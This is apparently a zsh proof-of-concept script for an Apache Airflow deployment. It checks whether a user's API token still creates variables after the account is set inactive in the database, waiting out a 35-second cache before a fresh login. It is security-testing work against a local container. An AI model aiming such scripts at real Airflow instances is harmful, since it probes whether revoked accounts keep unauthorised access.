#!/bin/zsh
set -u
H=$1; C=$2; U=cvevictim
tk() { curl -s -o /tmp/cv.$$ -w "%{http_code}" -X POST $H/auth/token -H 'Content-Type: application/json' -d "{\"username\":\"$1\",\"password\":\"$2\"}"; }
post() { curl -s -o /dev/null -w "%{http_code}" -X POST -H "Authorization: Bearer $1" -H 'Content-Type: application/json' $H/api/v2/variables -d "{\"key\":\"$2\",\"value\":\"1\",\"description\":\"\"}"; }
tk admin adminpass >/dev/null; AT=$(python3 -c "import json;print(json.load(open('/tmp/cv.$$'))['access_token'])")
curl -s -o /dev/null -X DELETE -H "Authorization: Bearer $AT" $H/auth/fab/v1/users/$U
curl -s -o /dev/null -X POST -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' $H/auth/fab/v1/users \
  -d "{\"username\":\"$U\",\"password\":\"victimpass\",\"email\":\"$U@x.com\",\"first_name\":\"c\",\"last_name\":\"v\",\"roles\":[{\"name\":\"Op\"}]}"
tk $U victimpass >/dev/null; VT=$(python3 -c "import json;print(json.load(open('/tmp/cv.$$'))['access_token'])")
print -r -- "provider: $(docker exec $C python -c 'import airflow.providers.fab as m;print(m.__version__)' 2>/dev/null)"
print -r -- "01 source stale-token POST /api/v2/variables : $(post $VT c_src_$RANDOM)"
docker exec $C python -c "
import sqlite3
c=sqlite3.connect('/opt/airflow/airflow.db'); c.execute(\"update ab_user set active=0 where username='$U'\"); c.commit()
print('active now', c.execute(\"select active from ab_user where username='$U'\").fetchone())"
print -r -- "02 transition: ab_user.active=0 (ngoài HTTP)"
sleep 35
print -r -- "03 follow-up stale-token POST (sau 35s, quá cache) : $(post $VT c_f_$RANDOM)"
LC=$(tk $U victimpass); print -r -- "04 D1 fresh login POST /auth/token                 : $LC"
LT=$(python3 -c "import json;print(json.load(open('/tmp/cv.$$')).get('access_token',''))" 2>/dev/null)
if [[ -n $LT ]]; then print -r -- "05 D1 fresh-token POST /api/v2/variables            : $(post $LT c_n_$RANDOM)"; else print -r -- "05 không có token mới"; fi
rm -f /tmp/cv.$$
